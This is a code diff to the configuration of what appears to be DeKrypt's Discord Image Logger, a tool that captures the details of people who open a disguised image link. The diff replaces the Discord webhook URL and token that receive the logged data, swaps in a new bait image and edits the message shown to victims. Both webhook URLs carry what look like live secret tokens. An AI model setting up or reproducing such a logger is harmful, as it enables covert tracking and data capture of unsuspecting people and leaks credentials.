@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1458935037515927562/9JcIQWPybnAT5H8EwjNTHA0UmPTJOAPf2C944nV08FqOqWoIOPj7B6x8q0k-D5X27_GW",
-    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1469867434377744651/v9okmnStECTo28AuyBSHdO2ytTuTwoQaL_b6u2W2ijGrA0fFI4K9uS57l6BEeVvTpLYr",
+    "image": "https://ih1.redbubble.net/image.2595320116.9420/raf,360x360,075,t,fafafa:ca443f4786.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "you cooked", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
